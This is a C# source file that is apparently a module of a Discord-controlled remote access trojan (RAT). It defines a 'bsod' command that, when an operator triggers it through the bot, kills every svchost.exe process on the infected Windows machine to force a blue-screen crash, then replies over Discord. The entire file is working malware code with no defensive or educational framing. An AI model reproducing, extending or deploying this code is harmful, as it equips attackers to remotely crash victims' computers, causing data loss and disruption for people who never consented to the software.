using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Discord.RAT.Modules
{
    public class BSOD : ModuleBase
    {
        [Command("bsod", RunMode = RunMode.Async)]

        public async Task CreateBSOD()
        {
            await ReplyAsync("Killing svchost.exe.. (Bot will disconnect without notice.)");


            var process = Process.GetProcessesByName("svchost");

            foreach (var proc in process)
            {
                try
                {
                    proc.Kill();
                }
                catch
                {
                    await ReplyAsync("Couldn't kill svchost.exe");
                }

            }

        }
    }
}
